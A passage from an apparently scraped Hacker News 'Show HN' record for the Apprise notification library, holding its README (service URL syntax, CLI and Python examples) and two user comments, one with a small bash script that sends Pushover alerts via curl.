fcm://project@apikey/DEVICE_IDfcm://project@apikey/#TOPICfcm://project@apikey/DEVICE_ID1/#topic1/#topic2/DEVICE_ID2/ Flock flock:// (TCP) 443 flock://tokenflock://botname@tokenflock://app_token/u:useridflock://app_token/g:channel_idflock://app_token/u:userid/g:channel_id Gitter gitter:// (TCP) 443 gitter://token/roomgitter://token/room1/room2/roomN Google Chat gchat:// (TCP) 443 gchat://workspace/key/token Gotify gotify:// or gotifys:// (TCP) 80 or 443 gotify://hostname/tokengotifys://hostname/token?priority=high Growl growl:// (UDP) 23053 growl://hostnamegrowl://hostname:portnogrowl://password@hostnamegrowl://password@hostname:portNote: you can also use the get parameter version which can allow the growl request to behave using the older v1.x protocol. An example would look like: growl://hostname?version=1 Home Assistant hassio:// or hassios:// (TCP) 8123 or 443 hassio://hostname/accesstokenhassio://user@hostname/accesstokenhassio://user:password@hostname:port/accesstokenhassio://hostname/optional/path/accesstoken IFTTT ifttt:// (TCP) 443 ifttt://webhooksID/Eventifttt://webhooksID/Event1/Event2/EventNifttt://webhooksID/Event1/?+Key=Valueifttt://webhooksID/Event1/?-Key=value1 Join join:// (TCP) 443 join://apikey/devicejoin://apikey/device1/device2/deviceN/join://apikey/groupjoin://apikey/groupA/groupB/groupNjoin://apikey/DeviceA/groupA/groupN/DeviceN/ KODI kodi:// or kodis:// (TCP) 8080 or 443 kodi://hostnamekodi://user@hostnamekodi://user:password@hostname:port Kumulos kumulos:// (TCP) 443 kumulos://apikey/serverkey LaMetric Time lametric:// (TCP) 443 lametric://apikey@device_ipaddrlametric://apikey@hostname:portlametric://client_id@client_secret Mailgun mailgun:// (TCP) 443 mailgun://user@hostname/apikeymailgun://user@hostname/apikey/emailmailgun://user@hostname/apikey/email1/email2/emailNmailgun://user@hostname/apikey/?name=\"From%20User\" Matrix matrix:// or matrixs:// (TCP) 80 or 443 matrix://hostnamematrix://user@hostnamematrixs://user:pass@hostname:port/#room_aliasmatrixs://user:pass@hostname:port/!room_idmatrixs://user:pass@hostname:port/#room_alias/!room_id/#room2matrixs://token@hostname:port/?webhook=matrixmatrix://user:token@hostname/?webhook=slack&format=markdown Mattermost mmost:// or mmosts:// (TCP) 8065 mmost://hostname/authkeymmost://hostname:80/authkeymmost://user@hostname:80/authkeymmost://hostname/authkey?channel=channelmmosts://hostname/authkeymmosts://user@hostname/authkey Microsoft Teams msteams:// (TCP) 443 msteams://TokenA/TokenB/TokenC/ MQTT mqtt:// or mqtts:// (TCP) 1883 or 8883 mqtt://hostname/topicmqtt://user@hostname/topicmqtts://user:pass@hostname:9883/topic Nextcloud ncloud:// or nclouds:// (TCP) 80 or 443 ncloud://adminuser:pass@host/Usernclouds://adminuser:pass@host/User1/User2/UserN Notica notica:// (TCP) 443 notica://Token/ Notifico notifico:// (TCP) 443 notifico://ProjectID/MessageHook/ Office 365 o365:// (TCP) 443 o365://TenantID:AccountEmail/ClientID/ClientSecreto365://TenantID:AccountEmail/ClientID/ClientSecret/TargetEmailo365://TenantID:AccountEmail/ClientID/ClientSecret/TargetEmail1/TargetEmail2/TargetEmailN OneSignal onesignal:// (TCP) 443 onesignal://AppID@APIKey/PlayerIDonesignal://TemplateID:AppID@APIKey/UserIDonesignal://AppID@APIKey/#IncludeSegmentonesignal://AppID@APIKey/Email Opsgenie opsgenie:// (TCP) 443 opsgenie://APIKeyopsgenie://APIKey/UserIDopsgenie://APIKey/#Teamopsgenie://APIKey/*Scheduleopsgenie://APIKey/^Escalation ParsePlatform parsep:// or parseps:// (TCP) 80 or 443 parsep://AppID:MasterKey@Hostnameparseps://AppID:MasterKey@Hostname PopcornNotify popcorn:// (TCP) 443 popcorn://ApiKey/ToPhoneNopopcorn://ApiKey/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/popcorn://ApiKey/ToEmailpopcorn://ApiKey/ToEmail1/ToEmail2/ToEmailN/popcorn://ApiKey/ToPhoneNo1/ToEmail1/ToPhoneNoN/ToEmailN Prowl prowl:// (TCP) 443 prowl://apikeyprowl://apikey/providerkey PushBullet pbul:// (TCP) 443 pbul://accesstokenpbul://accesstoken/#channelpbul://accesstoken/A_DEVICE_IDpbul://accesstoken/email@address.compbul://accesstoken/#channel/#channel2/email@address.net/DEVICE Pushjet pjet:// or pjets:// (TCP) 80 or 443 pjet://hostname/secretpjet://hostname:port/secretpjets://secret@hostname/secretpjets://hostname:port/secret Push (Techulus) push:// (TCP) 443 push://apikey/ Pushed pushed:// (TCP) 443 pushed://appkey/appsecret/pushed://appkey/appsecret/#ChannelAliaspushed://appkey/appsecret/#ChannelAlias1/#ChannelAlias2/#ChannelAliasNpushed://appkey/appsecret/@UserPushedIDpushed://appkey/appsecret/@UserPushedID1/@UserPushedID2/@UserPushedIDN Pushover pover:// (TCP) 443 pover://user@tokenpover://user@token/DEVICEpover://user@token/DEVICE1/DEVICE2/DEVICENNote: you must specify both your user_id and token PushSafer psafer:// or psafers:// (TCP) 80 or 443 psafer://privatekeypsafers://privatekey/DEVICEpsafer://privatekey/DEVICE1/DEVICE2/DEVICEN Reddit reddit:// (TCP) 443 reddit://user:password@app_id/app_secret/subredditreddit://user:password@app_id/app_secret/sub1/sub2/subN Rocket.Chat rocket:// or rockets:// (TCP) 80 or 443 rocket://user:password@hostname/RoomID/Channelrockets://user:password@hostname:443/#Channel1/#Channel1/RoomIDrocket://user:password@hostname/#Channelrocket://webhook@hostnamerockets://webhook@hostname/@User/#Channel Ryver ryver:// (TCP) 443 ryver://Organization/Tokenryver://botname@Organization/Token SendGrid sendgrid:// (TCP) 443 sendgrid://APIToken:FromEmail/sendgrid://APIToken:FromEmail/ToEmailsendgrid://APIToken:FromEmail/ToEmail1/ToEmail2/ToEmailN/ SimplePush spush:// (TCP) 443 spush://apikeyspush://salt:password@apikeyspush://apikey?event=Apprise Slack slack:// (TCP) 443 slack://TokenA/TokenB/TokenC/slack://TokenA/TokenB/TokenC/Channelslack://botname@TokenA/TokenB/TokenC/Channelslack://user@TokenA/TokenB/TokenC/Channel1/Channel2/ChannelN SMTP2Go smtp2go:// (TCP) 443 smtp2go://user@hostname/apikeysmtp2go://user@hostname/apikey/emailsmtp2go://user@hostname/apikey/email1/email2/emailNsmtp2go://user@hostname/apikey/?name=\"From%20User\" Streamlabs strmlabs:// (TCP) 443 strmlabs://AccessToken/strmlabs://AccessToken/?name=name&identifier=identifier&amount=0&currency=USD SparkPost sparkpost:// (TCP) 443 sparkpost://user@hostname/apikeysparkpost://user@hostname/apikey/emailsparkpost://user@hostname/apikey/email1/email2/emailNsparkpost://user@hostname/apikey/?name=\"From%20User\" Spontit spontit:// (TCP) 443 spontit://UserID@APIKey/spontit://UserID@APIKey/Channelspontit://UserID@APIKey/Channel1/Channel2/ChannelN Syslog syslog:// (UDP) 514 (if hostname specified) syslog://syslog://Facilitysyslog://hostnamesyslog://hostname/Facility Telegram tgram:// (TCP) 443 tgram://bottoken/ChatIDtgram://bottoken/ChatID1/ChatID2/ChatIDN Twitter twitter:// (TCP) 443 twitter://CKey/CSecret/AKey/ASecrettwitter://user@CKey/CSecret/AKey/ASecrettwitter://CKey/CSecret/AKey/ASecret/User1/User2/User2twitter://CKey/CSecret/AKey/ASecret?mode=tweet Twist twist:// (TCP) 443 twist://pasword:logintwist://password:login/#channeltwist://password:login/#team:channeltwist://password:login/#team:channel1/channel2/#team3:channel XBMC xbmc:// or xbmcs:// (TCP) 8080 or 443 xbmc://hostnamexbmc://user@hostnamexbmc://user:password@hostname:port XMPP xmpp:// or xmpps:// (TCP) 5222 or 5223 xmpp://password@hostnamexmpp://user:password@hostnamexmpps://user:password@hostname:port?jid=user@hostname/resourcexmpps://password@hostname/target@myhost, target2@myhost/resource Webex Teams (Cisco) wxteams:// (TCP) 443 wxteams://Token Zulip Chat zulip:// (TCP) 443 zulip://botname@Organization/Tokenzulip://botname@Organization/Token/Streamzulip://botname@Organization/Token/Email SMS Notification Support Notification Service Service ID Default Port Example Syntax AWS SNS sns:// (TCP) 443 sns://AccessKeyID/AccessSecretKey/RegionName/+PhoneNosns://AccessKeyID/AccessSecretKey/RegionName/+PhoneNo1/+PhoneNo2/+PhoneNoNsns://AccessKeyID/AccessSecretKey/RegionName/Topicsns://AccessKeyID/AccessSecretKey/RegionName/Topic1/Topic2/TopicN ClickSend clicksend:// (TCP) 443 clicksend://user:pass@PhoneNoclicksend://user:pass@ToPhoneNo1/ToPhoneNo2/ToPhoneNoN D7 Networks d7sms:// (TCP) 443 d7sms://user:pass@PhoneNod7sms://user:pass@ToPhoneNo1/ToPhoneNo2/ToPhoneNoN DingTalk dingtalk:// (TCP) 443 dingtalk://token/dingtalk://token/ToPhoneNodingtalk://token/ToPhoneNo1/ToPhoneNo2/ToPhoneNo1/ Kavenegar kavenegar:// (TCP) 443 kavenegar://ApiKey/ToPhoneNokavenegar://FromPhoneNo@ApiKey/ToPhoneNokavenegar://ApiKey/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN MessageBird msgbird:// (TCP) 443 msgbird://ApiKey/FromPhoneNomsgbird://ApiKey/FromPhoneNo/ToPhoneNomsgbird://ApiKey/FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ MSG91 msg91:// (TCP) 443 msg91://AuthKey/ToPhoneNomsg91://SenderID@AuthKey/ToPhoneNomsg91://AuthKey/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Nexmo nexmo:// (TCP) 443 nexmo://ApiKey:ApiSecret@FromPhoneNonexmo://ApiKey:ApiSecret@FromPhoneNo/ToPhoneNonexmo://ApiKey:ApiSecret@FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Sinch sinch:// (TCP) 443 sinch://ServicePlanId:ApiToken@FromPhoneNosinch://ServicePlanId:ApiToken@FromPhoneNo/ToPhoneNosinch://ServicePlanId:ApiToken@FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/sinch://ServicePlanId:ApiToken@ShortCode/ToPhoneNosinch://ServicePlanId:ApiToken@ShortCode/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Twilio twilio:// (TCP) 443 twilio://AccountSid:AuthToken@FromPhoneNotwilio://AccountSid:AuthToken@FromPhoneNo/ToPhoneNotwilio://AccountSid:AuthToken@FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/twilio://AccountSid:AuthToken@FromPhoneNo/ToPhoneNo?apikey=Keytwilio://AccountSid:AuthToken@ShortCode/ToPhoneNotwilio://AccountSid:AuthToken@ShortCode/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Desktop Notification Support Notification Service Service ID Default Port Example Syntax Linux DBus Notifications dbus://qt://glib://kde:// n/a dbus://qt://glib://kde:// Linux Gnome Notifications gnome:// n/a gnome:// MacOS X Notifications macosx:// n/a macosx:// Windows Notifications windows:// n/a windows:// Email Support Service ID Default Port Example Syntax mailto:// (TCP) 25 mailto://userid:pass@domain.commailto://domain.com?user=userid&pass=passwordmailto://domain.com:2525?user=userid&pass=passwordmailto://user@gmail.com&pass=passwordmailto://mySendingUsername:mySendingPassword@example.com?to=receivingAddress@example.commailto://userid:password@example.com?smtp=mail.example.com&from=noreply@example.com&name=no%20reply mailtos:// (TCP) 587 mailtos://userid:pass@domain.commailtos://domain.com?user=userid&pass=passwordmailtos://domain.com:465?user=userid&pass=passwordmailtos://user@hotmail.com&pass=passwordmailtos://mySendingUsername:mySendingPassword@example.com?to=receivingAddress@example.commailtos://userid:password@example.com?smtp=mail.example.com&from=noreply@example.com&name=no%20reply Apprise have some email services built right into it (such as yahoo, fastmail, hotmail, gmail, etc) that greatly simplify the mailto:// service. See more details here. Custom Notifications Post Method Service ID Default Port Example Syntax JSON json:// or jsons:// (TCP) 80 or 443 json://hostnamejson://user@hostnamejson://user:password@hostname:portjson://hostname/a/path/to/post/to XML xml:// or xmls:// (TCP) 80 or 443 xml://hostnamexml://user@hostnamexml://user:password@hostname:portxml://hostname/a/path/to/post/to Installation The easiest way is to install this package is from pypi: Command Line A small command line tool is also provided with this package called apprise. If you know the server url's you wish to notify, you can simply provide them all on the command line and send your notifications that way: # Send a notification to as many servers as you want # as you can easily chain one after another (the -vv provides some # additional verbosity to help let you know what is going on): apprise -vv -t 'my title' -b 'my notification body' \\ 'mailto://myemail:mypass@gmail.com' \\ 'pbul://o.gn5kj6nfhv736I7jC3cj3QLRiyhgl98b' # If you don't specify a --body (-b) then stdin is used allowing # you to use the tool as part of your every day administration: cat /proc/cpuinfo | apprise -vv -t 'cpu info' \\ 'mailto://myemail:mypass@gmail.com' # The title field is totally optional uptime | apprise -vv \\ 'discord:///4174216298/JHMHI8qBe7bk2ZwO5U711o3dV_js' Configuration Files No one wants to put their credentials out for everyone to see on the command line. No problem apprise also supports configuration files. It can handle both a specific YAML format or a very simple TEXT format. You can also pull these configuration files via an HTTP query too! You can read more about the expected structure of the configuration files here. # By default if no url or configuration is specified aprise will attempt to load # configuration files (if present): # ~/.apprise # ~/.apprise.yml # ~/.config/apprise # ~/.config/apprise.yml # Windows users can store their default configuration files here: # %APPDATA%/Apprise/apprise # %APPDATA%/Apprise/apprise.yml # %LOCALAPPDATA%/Apprise/apprise # %LOCALAPPDATA%/Apprise/apprise.yml # If you loaded one of those files, your command line gets really easy: apprise -vv -t 'my title' -b 'my notification body' # If you want to deviate from the default paths or specify more than one, # just specify them using the --config switch: apprise -vv -t 'my title' -b 'my notification body' \\ --config=/path/to/my/config.yml # Got lots of configuration locations? No problem, you can specify them all: # Apprise can even fetch the configuration from over a network! apprise -vv -t 'my title' -b 'my notification body' \\ --config=/path/to/my/config.yml \\ --config=https://localhost/my/apprise/config Attaching Files Apprise also supports file attachments too! Specify as many attachments to a notification as you want. # Send a funny image you found on the internet to a colleague: apprise -vv --title 'Agile Joke' \\ --body 'Did you see this one yet?' \\ --attach https://i.redd.it/my2t4d2fx0u31.jpg \\ 'mailto://myemail:mypass@gmail.com' # Easily send an update from a critical server to your dev team apprise -vv --title 'system crash' \\ --body 'I do not think Jim fixed the bug; see attached...' \\ --attach /var/log/myprogram.log \\ --attach /var/debug/core.2345 \\ --tag devteam Developers To send a notification from within your python application, just do the following: import apprise # Create an Apprise instance apobj = apprise.Apprise() # Add all of the notification services by their server url. # A sample email notification: apobj.add('mailto://myuserid:mypass@gmail.com') # A sample pushbullet notification apobj.add('pbul://o.gn5kj6nfhv736I7jC3cj3QLRiyhgl98b') # Then notify these services any time you desire. The below would # notify all of the services loaded into our Apprise object. apobj.notify( body='what a great notification service!', title='my notification title', ) Configuration Files Developers need access to configuration files too. The good news is their use just involves declaring another object (called AppriseConfig) that the Apprise object can ingest. You can also freely mix and match config and notification entries as often as you wish! You can read more about the expected structure of the configuration files here. import apprise # Create an Apprise instance apobj = apprise.Apprise() # Create an Config instance config = apprise.AppriseConfig() # Add a configuration source: config.add('/path/to/my/config.yml') # Add another... config.add('https://myserver:8080/path/to/config') # Make sure to add our config into our apprise object apobj.add(config) # You can mix and match; add an entry directly if you want too # In this entry we associate the 'admin' tag with our notification apobj.add('mailto://myuser:mypass@hotmail.com', tag='admin') # Then notify these services any time you desire. The below would # notify all of the services that have not been bound to any specific # tag. apobj.notify( body='what a great notification service!', title='my notification title', ) # Tagging allows you to specifically target only specific notification # services you've loaded: apobj.notify( body='send a notification to our admin group', title='Attention Admins', # notify any services tagged with the 'admin' tag tag='admin', ) # If you want to notify absolutely everything (reguardless of whether # it's been tagged or not), just use the reserved tag of 'all': apobj.notify( body='send a notification to our admin group', title='Attention Admins', # notify absolutely everything loaded, reguardless on wether # it has a tag associated with it or not: tag='all', ) Attaching Files Attachments are very easy to send using the Apprise API: import apprise # Create an Apprise instance apobj = apprise.Apprise() # Add at least one service you want to notify apobj.add('mailto://myuser:mypass@hotmail.com') # Then send your attachment. apobj.notify( title='A great photo of our family', body='The flash caused Jane to close her eyes! hah! :)', attach='/local/path/to/my/DSC_003.jpg', ) # Send a web based attachment too! In the below example, we connect to a home # security camera and send a live image to an email. By default remote web # content is cached but for a security camera, we might want to call notify # again later in our code so we want our last image retrieved to expire(in # this case after 3 seconds). apobj.notify( title='Latest security image', attach='http:/admin:password@hikvision-cam01/ISAPI/Streaming/channels/101/picture?cache=3' ) To send more than one attachment, just use a list, set, or tuple instead: import apprise # Create an Apprise instance apobj = apprise.Apprise() # Add at least one service you want to notify apobj.add('mailto://myuser:mypass@hotmail.com') # Now add all of the entries we're intrested in: attach = ( # ?name= allows us to rename the actual jpeg as found on the site # to be another name when sent to our receipient(s) 'https://i.redd.it/my2t4d2fx0u31.jpg?name=FlyingToMars.jpg', # Now add another: '/path/to/funny/joke.gif', ) # Send your multiple attachments with a single notify call: apobj.notify( title='Some good jokes.', body='Hey guys, check out these!', attach=attach, ) Want To Learn More? If you're interested in reading more about this and other methods on how to customize your own notifications, please check out the following links: Using the CLI Development API Troubleshooting Configuration File Help Apprise API/Web Interface Showcase Want to help make Apprise better? Contribute to the Apprise Code Base Sponsorship and Donations ",
          "Cool stuff! But what about AWS SNS (<a href=\"https://aws.amazon.com/sns/\" rel=\"nofollow\">https://aws.amazon.com/sns/</a>) or Firebase Cloud Messaging (<a href=\"https://firebase.google.com/docs/cloud-messaging/\" rel=\"nofollow\">https://firebase.google.com/docs/cloud-messaging/</a>)?",
          "This is pretty cool, I drop the following shell script on all my servers:<p><pre><code>    #!/bin/bash\n    \n    if [[ -z $1 && -z $2 ]]; then\n        echo \"No Message passed\"\n    else\n        if [[ -z $2 ]]; then\n            curl -s --form-string \"token=MYAPPTOKEN\" --form-string \"user=MYUSERTOKEN\" --form-string \"message=$1\" https://api.pushover.net/1/messages.json\n        else\n            curl -s --form-string \"token=MYAPPTOKEN\" --form-string \"user=MYUSERTOKEN\" --form-string \"title=$1\" --form-string \"message=$2\"  https://api.pushover.net/1/messages.json\n        fi\n    fi\n</code></pre>\nIt's SUPER basic and probably shitty but for me it's perfect. I can add \" && push 'Command is Done'\" to the end of any command and get a notification on my watch/phone/(and desktop? But I don't have pushover on my desktop installed). Great for things you threw into a screen/tmux session and want to know when they finished."
        ],
        "story_type": ["ShowHN"],
        "url": "https://github.com/caronc/apprise",
        "comments.comment_id": [19026288, 19027306],
        "comments.comment_author": ["harryf", "joshstrange"],
        "comments.comment_descendants": [1, 0],
        "comments.comment_time": [
          "2019-01-29T14:00:21Z",
          "2019-01-29T15:54:22Z"
        ],
        "comments.comment_text": [
          "Cool stuff! But what about AWS SNS (<a href=\"https://aws.amazon.com/sns/\" rel=\"nofollow\">https://aws.amazon.com/sns/</a>) or Firebase Cloud Messaging (<a href=\"https://firebase.google.com/docs/cloud-messaging/\" rel=\"nofollow\">https://firebase.google.com/docs/cloud-messaging/</a>)?",
          "This is pretty cool, I drop the following shell script on all my servers:<p><pre><code>    #!/bin/bash\n    \n    if [[ -z $1 && -z $2 ]]; then\n        echo \"No Message passed\"\n    else\n        if [[ -z $2 ]]; then\n            curl -s --form-string \"token=MYAPPTOKEN\" --form-string \"user=MYUSERTOKEN\" --form-string \"message=$1\" https://api.pushover.net/1/messages.json\n        else\n            curl -s --form-string \"token=MYAPPTOKEN\" --form-string \"user=MYUSERTOKEN\" --form-string \"title=$1\" --form-string \"message=$2\"  https://api.pushover.net/1/messages.json\n        fi\n    fi\n</code></pre>\nIt's SUPER basic and probably shitty but for me it's perfect. I can add \" && push 'Command is Done'\" to the end of any command and get a notification on my watch/phone/(and desktop? But I don't have pushover on my desktop installed). Great for things you threw into a screen/tmux session and want to know when they finished."
        ],
        "id": "f3d2c170-2386-4d2b-8d6e-da611fd95641",
        "url_text": "apprise / verb To inform or tell (someone). To make one aware of something. Apprise allows you to send a notification to almost all of the most popular notification services available to us today such as: Telegram, Discord, Slack, Amazon SNS, Gotify, etc. One notification library to rule them all. A common and intuitive notification syntax. Supports the handling of images and attachments (to the notification services that will accept them). It's incredibly lightweight. Amazing response times because all messages sent asynchronously. Developers who wish to provide a notification service no longer need to research each and every one out there. They no longer need to try to adapt to the new ones that comeout thereafter. They just need to include this one library and then they can immediately gain access to almost all of the notifications services available to us today. System Administrators and DevOps who wish to send a notification now no longer need to find the right tool for the job. Everything is already wrapped and supported within the apprise command line tool (CLI) that ships with this product. Supported Notifications The section identifies all of the services supported by this library. Check out the wiki for more information on the supported modules here. Popular Notification Services The table below identifies the services this tool supports and some example service urls you need to use in order to take advantage of it. Click on any of the services listed below to get more details on how you can configure Apprise to access them. Notification Service Service ID Default Port Example Syntax Apprise API apprise:// or apprises:// (TCP) 80 or 443 apprise://hostname/Token Boxcar boxcar:// (TCP) 443 boxcar://hostnameboxcar://hostname/@tagboxcar://hostname/device_tokenboxcar://hostname/device_token1/device_token2/device_tokenNboxcar://hostname/@tag/@tag2/device_token Discord discord:// (TCP) 443 discord://webhook_id/webhook_tokendiscord://avatar@webhook_id/webhook_token Emby emby:// or embys:// (TCP) 8096 emby://user@hostname/emby://user:password@hostname Enigma2 enigma2:// or enigma2s:// (TCP) 80 or 443 enigma2://hostname Faast faast:// (TCP) 443 faast://authorizationtoken FCM fcm:// (TCP) 443 fcm://project@apikey/DEVICE_IDfcm://project@apikey/#TOPICfcm://project@apikey/DEVICE_ID1/#topic1/#topic2/DEVICE_ID2/ Flock flock:// (TCP) 443 flock://tokenflock://botname@tokenflock://app_token/u:useridflock://app_token/g:channel_idflock://app_token/u:userid/g:channel_id Gitter gitter:// (TCP) 443 gitter://token/roomgitter://token/room1/room2/roomN Google Chat gchat:// (TCP) 443 gchat://workspace/key/token Gotify gotify:// or gotifys:// (TCP) 80 or 443 gotify://hostname/tokengotifys://hostname/token?priority=high Growl growl:// (UDP) 23053 growl://hostnamegrowl://hostname:portnogrowl://password@hostnamegrowl://password@hostname:portNote: you can also use the get parameter version which can allow the growl request to behave using the older v1.x protocol. An example would look like: growl://hostname?version=1 Home Assistant hassio:// or hassios:// (TCP) 8123 or 443 hassio://hostname/accesstokenhassio://user@hostname/accesstokenhassio://user:password@hostname:port/accesstokenhassio://hostname/optional/path/accesstoken IFTTT ifttt:// (TCP) 443 ifttt://webhooksID/Eventifttt://webhooksID/Event1/Event2/EventNifttt://webhooksID/Event1/?+Key=Valueifttt://webhooksID/Event1/?-Key=value1 Join join:// (TCP) 443 join://apikey/devicejoin://apikey/device1/device2/deviceN/join://apikey/groupjoin://apikey/groupA/groupB/groupNjoin://apikey/DeviceA/groupA/groupN/DeviceN/ KODI kodi:// or kodis:// (TCP) 8080 or 443 kodi://hostnamekodi://user@hostnamekodi://user:password@hostname:port Kumulos kumulos:// (TCP) 443 kumulos://apikey/serverkey LaMetric Time lametric:// (TCP) 443 lametric://apikey@device_ipaddrlametric://apikey@hostname:portlametric://client_id@client_secret Mailgun mailgun:// (TCP) 443 mailgun://user@hostname/apikeymailgun://user@hostname/apikey/emailmailgun://user@hostname/apikey/email1/email2/emailNmailgun://user@hostname/apikey/?name=\"From%20User\" Matrix matrix:// or matrixs:// (TCP) 80 or 443 matrix://hostnamematrix://user@hostnamematrixs://user:pass@hostname:port/#room_aliasmatrixs://user:pass@hostname:port/!room_idmatrixs://user:pass@hostname:port/#room_alias/!room_id/#room2matrixs://token@hostname:port/?webhook=matrixmatrix://user:token@hostname/?webhook=slack&format=markdown Mattermost mmost:// or mmosts:// (TCP) 8065 mmost://hostname/authkeymmost://hostname:80/authkeymmost://user@hostname:80/authkeymmost://hostname/authkey?channel=channelmmosts://hostname/authkeymmosts://user@hostname/authkey Microsoft Teams msteams:// (TCP) 443 msteams://TokenA/TokenB/TokenC/ MQTT mqtt:// or mqtts:// (TCP) 1883 or 8883 mqtt://hostname/topicmqtt://user@hostname/topicmqtts://user:pass@hostname:9883/topic Nextcloud ncloud:// or nclouds:// (TCP) 80 or 443 ncloud://adminuser:pass@host/Usernclouds://adminuser:pass@host/User1/User2/UserN Notica notica:// (TCP) 443 notica://Token/ Notifico notifico:// (TCP) 443 notifico://ProjectID/MessageHook/ Office 365 o365:// (TCP) 443 o365://TenantID:AccountEmail/ClientID/ClientSecreto365://TenantID:AccountEmail/ClientID/ClientSecret/TargetEmailo365://TenantID:AccountEmail/ClientID/ClientSecret/TargetEmail1/TargetEmail2/TargetEmailN OneSignal onesignal:// (TCP) 443 onesignal://AppID@APIKey/PlayerIDonesignal://TemplateID:AppID@APIKey/UserIDonesignal://AppID@APIKey/#IncludeSegmentonesignal://AppID@APIKey/Email Opsgenie opsgenie:// (TCP) 443 opsgenie://APIKeyopsgenie://APIKey/UserIDopsgenie://APIKey/#Teamopsgenie://APIKey/*Scheduleopsgenie://APIKey/^Escalation ParsePlatform parsep:// or parseps:// (TCP) 80 or 443 parsep://AppID:MasterKey@Hostnameparseps://AppID:MasterKey@Hostname PopcornNotify popcorn:// (TCP) 443 popcorn://ApiKey/ToPhoneNopopcorn://ApiKey/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/popcorn://ApiKey/ToEmailpopcorn://ApiKey/ToEmail1/ToEmail2/ToEmailN/popcorn://ApiKey/ToPhoneNo1/ToEmail1/ToPhoneNoN/ToEmailN Prowl prowl:// (TCP) 443 prowl://apikeyprowl://apikey/providerkey PushBullet pbul:// (TCP) 443 pbul://accesstokenpbul://accesstoken/#channelpbul://accesstoken/A_DEVICE_IDpbul://accesstoken/email@address.compbul://accesstoken/#channel/#channel2/email@address.net/DEVICE Pushjet pjet:// or pjets:// (TCP) 80 or 443 pjet://hostname/secretpjet://hostname:port/secretpjets://secret@hostname/secretpjets://hostname:port/secret Push (Techulus) push:// (TCP) 443 push://apikey/ Pushed pushed:// (TCP) 443 pushed://appkey/appsecret/pushed://appkey/appsecret/#ChannelAliaspushed://appkey/appsecret/#ChannelAlias1/#ChannelAlias2/#ChannelAliasNpushed://appkey/appsecret/@UserPushedIDpushed://appkey/appsecret/@UserPushedID1/@UserPushedID2/@UserPushedIDN Pushover pover:// (TCP) 443 pover://user@tokenpover://user@token/DEVICEpover://user@token/DEVICE1/DEVICE2/DEVICENNote: you must specify both your user_id and token PushSafer psafer:// or psafers:// (TCP) 80 or 443 psafer://privatekeypsafers://privatekey/DEVICEpsafer://privatekey/DEVICE1/DEVICE2/DEVICEN Reddit reddit:// (TCP) 443 reddit://user:password@app_id/app_secret/subredditreddit://user:password@app_id/app_secret/sub1/sub2/subN Rocket.Chat rocket:// or rockets:// (TCP) 80 or 443 rocket://user:password@hostname/RoomID/Channelrockets://user:password@hostname:443/#Channel1/#Channel1/RoomIDrocket://user:password@hostname/#Channelrocket://webhook@hostnamerockets://webhook@hostname/@User/#Channel Ryver ryver:// (TCP) 443 ryver://Organization/Tokenryver://botname@Organization/Token SendGrid sendgrid:// (TCP) 443 sendgrid://APIToken:FromEmail/sendgrid://APIToken:FromEmail/ToEmailsendgrid://APIToken:FromEmail/ToEmail1/ToEmail2/ToEmailN/ SimplePush spush:// (TCP) 443 spush://apikeyspush://salt:password@apikeyspush://apikey?event=Apprise Slack slack:// (TCP) 443 slack://TokenA/TokenB/TokenC/slack://TokenA/TokenB/TokenC/Channelslack://botname@TokenA/TokenB/TokenC/Channelslack://user@TokenA/TokenB/TokenC/Channel1/Channel2/ChannelN SMTP2Go smtp2go:// (TCP) 443 smtp2go://user@hostname/apikeysmtp2go://user@hostname/apikey/emailsmtp2go://user@hostname/apikey/email1/email2/emailNsmtp2go://user@hostname/apikey/?name=\"From%20User\" Streamlabs strmlabs:// (TCP) 443 strmlabs://AccessToken/strmlabs://AccessToken/?name=name&identifier=identifier&amount=0&currency=USD SparkPost sparkpost:// (TCP) 443 sparkpost://user@hostname/apikeysparkpost://user@hostname/apikey/emailsparkpost://user@hostname/apikey/email1/email2/emailNsparkpost://user@hostname/apikey/?name=\"From%20User\" Spontit spontit:// (TCP) 443 spontit://UserID@APIKey/spontit://UserID@APIKey/Channelspontit://UserID@APIKey/Channel1/Channel2/ChannelN Syslog syslog:// (UDP) 514 (if hostname specified) syslog://syslog://Facilitysyslog://hostnamesyslog://hostname/Facility Telegram tgram:// (TCP) 443 tgram://bottoken/ChatIDtgram://bottoken/ChatID1/ChatID2/ChatIDN Twitter twitter:// (TCP) 443 twitter://CKey/CSecret/AKey/ASecrettwitter://user@CKey/CSecret/AKey/ASecrettwitter://CKey/CSecret/AKey/ASecret/User1/User2/User2twitter://CKey/CSecret/AKey/ASecret?mode=tweet Twist twist:// (TCP) 443 twist://pasword:logintwist://password:login/#channeltwist://password:login/#team:channeltwist://password:login/#team:channel1/channel2/#team3:channel XBMC xbmc:// or xbmcs:// (TCP) 8080 or 443 xbmc://hostnamexbmc://user@hostnamexbmc://user:password@hostname:port XMPP xmpp:// or xmpps:// (TCP) 5222 or 5223 xmpp://password@hostnamexmpp://user:password@hostnamexmpps://user:password@hostname:port?jid=user@hostname/resourcexmpps://password@hostname/target@myhost, target2@myhost/resource Webex Teams (Cisco) wxteams:// (TCP) 443 wxteams://Token Zulip Chat zulip:// (TCP) 443 zulip://botname@Organization/Tokenzulip://botname@Organization/Token/Streamzulip://botname@Organization/Token/Email SMS Notification Support Notification Service Service ID Default Port Example Syntax AWS SNS sns:// (TCP) 443 sns://AccessKeyID/AccessSecretKey/RegionName/+PhoneNosns://AccessKeyID/AccessSecretKey/RegionName/+PhoneNo1/+PhoneNo2/+PhoneNoNsns://AccessKeyID/AccessSecretKey/RegionName/Topicsns://AccessKeyID/AccessSecretKey/RegionName/Topic1/Topic2/TopicN ClickSend clicksend:// (TCP) 443 clicksend://user:pass@PhoneNoclicksend://user:pass@ToPhoneNo1/ToPhoneNo2/ToPhoneNoN D7 Networks d7sms:// (TCP) 443 d7sms://user:pass@PhoneNod7sms://user:pass@ToPhoneNo1/ToPhoneNo2/ToPhoneNoN DingTalk dingtalk:// (TCP) 443 